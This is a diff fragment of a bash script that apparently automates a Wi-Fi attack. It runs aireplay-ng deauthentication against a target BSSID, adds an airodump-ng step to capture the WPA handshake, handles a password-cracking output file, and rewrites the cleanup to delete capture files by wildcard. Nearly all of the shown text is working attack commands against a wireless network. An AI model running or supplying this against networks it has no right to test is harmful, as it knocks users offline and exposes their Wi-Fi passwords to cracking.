@@ -62,7 +62,11 @@ if [[ $anwser == "y" ]]; then
   echo " "
   sudo aireplay-ng --deauth 25 -a $bssid $newinterface
   echo " "
+  # Monitoring target again.
+  sudo airodump-ng -w test -c $channel --bssid $bssid $newinterface
+  echo " "
 fi
+
 
 # Capturing handshake.
 echo ' '
@@ -76,18 +80,15 @@ cat /home/brian/Desktop/scripts/pswrd_process
 cd /home/brian/Desktop/scripts/
 
 # Deleting used files.
-rm /home/brian/Desktop/scripts/test-01.cap
-rm /home/brian/Desktop/scripts/test-01.csv
-rm /home/brian/Desktop/scripts/test-01.kismet.csv
-rm /home/brian/Desktop/scripts/test-01.kismet.netxml
-rm /home/brian/Desktop/scripts/test-01.log.csv
-rm /home/brian/Desktop/scripts/interfaces
-rm /home/brian/Desktop/scripts/pswrd*
+echo " "
+echo "removing used files which are useless now..."
+rm -f -v test*
+rm -f -v interfaces
+rm -f -v pswrd*
+
+
 
 # Stopping monitor mode.
 sudo airmon-ng stop $newinterface
 
 exit
-
-# NOT SURE IF THIS WILL WORK, IF NOT THEN FURTHER BASH KNOWLEDGE IS NEEDED!!!!
-# SCRPIT WORKS UNTIL SCANNING FOR Wi-Fi NETWORKS...
